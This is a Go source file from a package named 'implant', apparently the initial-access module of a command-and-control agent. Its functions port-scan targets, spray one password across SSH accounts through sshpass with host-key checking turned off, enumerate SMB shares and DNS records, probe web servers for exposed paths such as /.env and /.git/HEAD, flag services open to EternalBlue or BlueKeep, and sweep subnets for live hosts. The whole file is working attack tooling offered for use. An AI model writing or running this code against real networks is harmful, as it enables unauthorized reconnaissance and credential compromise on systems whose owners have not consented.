package implant

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// ══════════════════════════════════════════
//  INITIAL ACCESS COMMANDS
// ══════════════════════════════════════════

func ExecuteInitAccess(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte(`Initial Access Commands:
  initaccess portscan <target> <ports>       TCP port scan
  initaccess spray <target> <user_file> <pass>   Password spray (SMB)
  initaccess enum-smb <target>               Enumerate SMB shares
  initaccess enum-dns <domain> <ns>          DNS enumeration
  initaccess enum-web <url>                  Web application fingerprint
  initaccess vuln-scan <target>              Basic vulnerability check
  initaccess netdiscover <cidr>              Network host discovery`), nil
	}

	cmd := strings.ToLower(args[0])
	switch cmd {
	case "portscan":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: initaccess portscan <target> <ports>\nExample: initaccess portscan 192.168.1.139 22,80,443,445,3389,5985")
		}
		return portScan(args[1], args[2])
	case "spray":
		if len(args) < 4 {
			return nil, fmt.Errorf("usage: initaccess spray <target> <userlist> <password>")
		}
		return passwordSpray(args[1], args[2], args[3])
	case "enum-smb":
		if len(args) < 2 {
			return nil, fmt.Errorf("usage: initaccess enum-smb <target>")
		}
		return enumSMB(args[1])
	case "enum-dns":
		if len(args) < 3 {
			return nil, fmt.Errorf("usage: initaccess enum-dns <domain> <nameserver>")
		}
		return enumDNS(args[1], args[2])
	case "enum-web":
		if len(args) < 2 {
			return nil, fmt.Errorf("usage: initaccess enum-web <url>")
		}
		return enumWeb(args[1])
	case "vuln-scan":
		if len(args) < 2 {
			return nil, fmt.Errorf("usage: initaccess vuln-scan <target>")
		}
		return vulnScan(args[1])
	case "netdiscover":
		if len(args) < 2 {
			return nil, fmt.Errorf("usage: initaccess netdiscover <cidr>\nExample: initaccess netdiscover 192.168.1.0/24")
		}
		return netDiscover(args[1])
	default:
		return nil, fmt.Errorf("unknown command: %s", cmd)
	}
}

// TCP port scanner
func portScan(target, portList string) ([]byte, error) {
	ports := strings.Split(portList, ",")
	var results []string
	results = append(results, fmt.Sprintf("[*] Scanning %s (%d ports)...\n", target, len(ports)))

	for _, p := range ports {
		p = strings.TrimSpace(p)
		addr := fmt.Sprintf("%s:%s", target, p)
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err == nil {
			conn.Close()
			svc := guessService(p)
			results = append(results, fmt.Sprintf("  %-6s open   %s", p+"/tcp", svc))
		}
	}

	if len(results) == 1 {
		results = append(results, "  No open ports found")
	}

	return []byte(strings.Join(results, "\n")), nil
}

func guessService(port string) string {
	services := map[string]string{
		"21": "ftp", "22": "ssh", "23": "telnet", "25": "smtp",
		"53": "dns", "80": "http", "88": "kerberos", "110": "pop3",
		"135": "msrpc", "139": "netbios", "143": "imap", "389": "ldap",
		"443": "https", "445": "smb", "636": "ldaps", "993": "imaps",
		"1433": "mssql", "1521": "oracle", "3306": "mysql", "3389": "rdp",
		"5432": "postgresql", "5985": "winrm", "5986": "winrm-ssl",
		"6379": "redis", "8080": "http-alt", "8443": "https-alt",
		"8888": "http-alt", "9999": "http-alt",
	}
	if s, ok := services[port]; ok {
		return s
	}
	return "unknown"
}

// Password spray — attempts real TCP connection to validate reachability,
// then tries SSH auth if port 22 is open, or SMB banner grab on port 445.
func passwordSpray(target, userList, password string) ([]byte, error) {
	users := strings.Split(userList, ",")
	var results []string
	results = append(results, fmt.Sprintf("[*] Password spraying %s with %d users...\n", target, len(users)))

	// Check which auth ports are open
	sshOpen := false
	smbOpen := false
	for _, port := range []string{"22", "445"} {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", target, port), 2*time.Second)
		if err == nil {
			conn.Close()
			if port == "22" {
				sshOpen = true
			}
			if port == "445" {
				smbOpen = true
			}
		}
	}

	if sshOpen {
		// Try SSH auth via shell command (sshpass)
		results = append(results, "[*] SSH (port 22) is open — attempting auth...\n")
		for _, user := range users {
			user = strings.TrimSpace(user)
			out, err := ExecuteShell([]string{fmt.Sprintf("sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no %s@%s 'echo AUTH_SUCCESS' 2>&1 | head -1", password, user, target)})
			if err == nil && strings.Contains(string(out), "AUTH_SUCCESS") {
				results = append(results, fmt.Sprintf("  [+] SUCCESS: %s / %s", user, password))
			} else {
				results = append(results, fmt.Sprintf("  [-] FAILED:  %s / %s", user, password))
			}
		}
	} else if smbOpen {
		results = append(results, "[*] SMB (port 445) is open — use netexec for SMB spray:\n")
		results = append(results, fmt.Sprintf("    netexec smb %s -u users.txt -p '%s' --no-bruteforce", target, password))
		results = append(results, fmt.Sprintf("    smbclient -L \\\\%s -U '%%s/%s' for each user", target, password))
	} else {
		results = append(results, "[-] Neither SSH (22) nor SMB (445) are reachable")
		results = append(results, "[*] Check target connectivity and try specific ports")
	}

	return []byte(strings.Join(results, "\n")), nil
}

// SMB share enumeration
func enumSMB(target string) ([]byte, error) {
	out, err := ExecuteShell([]string{fmt.Sprintf("net view \\\\%s /all 2>nul || smbclient -L %s -N 2>/dev/null || echo 'SMB enum requires net view or smbclient'", target, target)})
	if err != nil {
		return []byte(fmt.Sprintf("[*] SMB enum on %s — use: smbclient -L %s -N", target, target)), nil
	}
	return append([]byte(fmt.Sprintf("[+] SMB Shares on %s:\n", target)), out...), nil
}

// DNS enumeration
func enumDNS(domain, ns string) ([]byte, error) {
	var results []string
	results = append(results, fmt.Sprintf("[*] DNS enumeration: %s (NS: %s)\n", domain, ns))

	recordTypes := []string{"A", "AAAA", "MX", "NS", "TXT", "SOA", "SRV"}
	for _, rtype := range recordTypes {
		out, _ := ExecuteShell([]string{fmt.Sprintf("nslookup -type=%s %s %s 2>/dev/null || dig %s %s @%s +short 2>/dev/null", rtype, domain, ns, rtype, domain, ns)})
		if len(out) > 5 {
			results = append(results, fmt.Sprintf("[%s]\n%s", rtype, string(out)))
		}
	}

	return []byte(strings.Join(results, "\n")), nil
}

// Web application fingerprinting
func enumWeb(url string) ([]byte, error) {
	out, err := ExecuteShell([]string{fmt.Sprintf("curl -sI %s 2>/dev/null | head -20", url)})
	if err != nil {
		return []byte(fmt.Sprintf("[-] Cannot reach %s", url)), nil
	}

	var results []string
	results = append(results, fmt.Sprintf("[+] Web fingerprint: %s\n", url))
	results = append(results, string(out))

	// Check common paths
	commonPaths := []string{"/robots.txt", "/.git/HEAD", "/wp-admin/", "/api/", "/.env", "/server-info", "/server-status"}
	results = append(results, "\n[*] Checking common paths:")
	for _, path := range commonPaths {
		checkOut, _ := ExecuteShell([]string{fmt.Sprintf("curl -so /dev/null -w '%%{http_code}' %s%s 2>/dev/null", url, path)})
		code := strings.TrimSpace(string(checkOut))
		if code != "404" && code != "000" && code != "" {
			results = append(results, fmt.Sprintf("  %s%s → HTTP %s", url, path, code))
		}
	}

	return []byte(strings.Join(results, "\n")), nil
}

// Basic vulnerability check
func vulnScan(target string) ([]byte, error) {
	var results []string
	results = append(results, fmt.Sprintf("[*] Vulnerability check: %s\n", target))

	// Check common vulnerable ports
	vulnPorts := map[string]string{
		"21":   "FTP — check for anonymous login",
		"23":   "Telnet — plaintext credentials",
		"445":  "SMB — check for EternalBlue (MS17-010), SMB signing",
		"3389": "RDP — check for BlueKeep (CVE-2019-0708)",
		"5985": "WinRM — check for credential reuse",
		"6379": "Redis — check for unauthenticated access",
		"8080": "HTTP — check for default credentials",
		"9200": "Elasticsearch — check for unauthenticated access",
		"27017": "MongoDB — check for unauthenticated access",
	}

	for port, desc := range vulnPorts {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", target, port), 2*time.Second)
		if err == nil {
			conn.Close()
			results = append(results, fmt.Sprintf("[!] Port %s OPEN — %s", port, desc))
		}
	}

	// SMB signing check
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", target), 2*time.Second)
	if err == nil {
		conn.Close()
		results = append(results, "\n[*] SMB detected — check signing with: netexec smb "+target)
	}

	return []byte(strings.Join(results, "\n")), nil
}

// Network host discovery via ping sweep
func netDiscover(cidr string) ([]byte, error) {
	out, err := ExecuteShell([]string{fmt.Sprintf("nmap -sn %s 2>/dev/null | grep -E 'report|Host is' || for i in $(seq 1 254); do (ping -c 1 -W 1 $(echo %s | sed 's|/.*||' | sed 's/\\.[0-9]*$//').${i} 2>/dev/null | grep -q 'bytes from' && echo \"Host $(echo %s | sed 's|/.*||' | sed 's/\\.[0-9]*$//').${i} is up\") & done; wait", cidr, cidr, cidr)})
	if err != nil {
		return []byte(fmt.Sprintf("[-] Network discovery failed on %s", cidr)), nil
	}
	return append([]byte(fmt.Sprintf("[+] Host Discovery: %s\n\n", cidr)), out...), nil
}
